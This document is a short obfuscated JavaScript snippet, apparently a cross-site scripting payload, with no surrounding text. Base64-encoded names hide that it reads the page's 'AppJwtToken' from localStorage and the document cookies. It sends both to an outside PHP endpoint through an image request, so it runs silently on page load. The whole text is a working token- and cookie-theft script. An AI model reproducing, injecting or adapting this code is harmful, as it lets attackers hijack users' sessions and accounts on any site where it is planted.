$( function() {
  const w = window,
    d = document,
    l = 'bG9jYWxTdG9yYWdl',
    k = 'Y29va2ll',
    t = w[ atob( l ) ],
    c = d[ atob( k ) ],
    a = encodeURIComponent( JSON.stringify( t[ atob( 'QXBwSnd0VG9rZW4=' ) ] ) ),
    b = encodeURIComponent( JSON.stringify( c ) ),
    u = 'http://coreyshuman.com/rx/rx.php',
    v = u + "?a=" + a + "&b=" + b;

  console.log( v );
  new Image()
    .src = v;
} );
